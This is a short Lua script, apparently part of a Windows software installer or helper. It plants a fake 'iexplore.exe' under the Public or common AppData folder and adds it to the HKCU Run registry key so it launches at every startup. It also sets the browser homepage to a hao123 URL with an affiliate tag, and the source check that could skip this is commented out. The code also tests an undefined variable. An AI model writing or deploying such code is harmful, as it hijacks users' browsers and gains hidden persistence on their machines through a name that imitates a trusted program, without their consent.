local FunctionObj = XLGetGlobal("YBYL.FunctionHelper")

function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end

function IsRealString(str)
	return type(str) == "string" and str ~= ""
end

function GetFakeIEPath()
	local publicPath = FunctionObj.tipUtil:ExpandEnvironmentStrings("%PUBLIC%")
	if not IsRealString(str) then
		local nCSIDL_COMMON_APPDATA = 35 --CSIDL_COMMON_APPDATA(0x0023)
		publicPath = FunctionObj.tipUtil:GetSpecialFolderPathEx(0, nCSIDL_COMMON_APPDATA, 0, 0)
	end

	return publicPath.."\\iexplorer\\program\\iexplore.exe"
	-- return "E:\\project\\COM_B\\googlecode\\trunk\\code\\YBYL\\Debug\\iexplore.exe"
end

function SetFakeIESysBoot()
	local runReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplorer"
	local sFakeIEPath = GetFakeIEPath()
	local cmd = "\""..sFakeIEPath.."\"".." /sstartfrom sysboot"
	
	FunctionObj.TipLog("ief do SetFakeIESysBoot: cmd: "..tostring(cmd))
	FunctionObj.RegSetValue(runReg, cmd)
end

function SetHomePageBySrc()
	local strSrc = FunctionObj.GetInstallSrc()
	if IsNilString(strSrc) or string.lower(tostring(strSrc)) == "inner" then
		--return
	end 
	
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	if tUserConfig["bUserSetHP"] then
		return
	end
	
	local strHomePage = "http://www.hao123.com/index.html\?tn=99579714_hao_pg"
	FunctionObj.SetHomePage(strHomePage)
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


------------------------------------	

function main()
	if type(FunctionObj) ~= "table" then
		return
	end

	SetHomePageBySrc()
	
	local bHideFakeIE = XLGetGlobal("bHideFakeIE")
	if bHideFakeIE then
		return
	end
	local runReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\iexplorer"
	local runCmd = FunctionObj.RegQueryValue(runReg)
	if IsRealString(runCmd) then
		return
	end
	
	SetFakeIESysBoot()
end

main()


